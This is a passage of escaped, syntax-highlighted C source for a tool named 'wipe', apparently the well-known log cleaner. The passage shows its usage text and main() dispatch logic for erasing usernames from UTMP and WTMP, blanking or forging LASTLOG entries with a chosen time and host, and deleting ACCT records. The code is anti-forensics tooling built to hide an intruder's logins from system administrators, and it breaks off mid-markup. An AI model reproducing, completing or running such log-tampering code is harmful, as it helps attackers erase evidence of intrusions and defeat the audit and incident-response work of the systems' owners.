class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003eusage\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USAGE: wipe [ u|w|l|a ] ...options...\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;UTMP editing:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;    Erase all usernames      :   wipe u [username]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;    Erase one username on tty:   wipe u [username] [tty]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;WTMP editing:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Erase last entry for user :   wipe w [username]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Erase last entry on tty   :   wipe w [username] [tty]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;LASTLOG editing:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Blank lastlog for user    :   wipe l [username]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Alter lastlog entry       :   wipe l [username] [tty] [time] [host]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\tWhere [time] is in the format [YYMMddhhmm]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef NO_ACCT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;ACCT editing:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;   Erase acct entries on tty :   wipe a [username] [tty]\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\u003cspan class=\"nf\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eargc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003eusage\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * First character of first argument determines which file to edit.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003etoupper\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * UTMP editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eswitch\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/* UTMP */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;U\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_utmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_utmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_utmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_utmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/* WTMP */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;W\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_wtmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_wtmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_wtmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewipe_wtmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\t\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/* LASTLOG */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;L\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 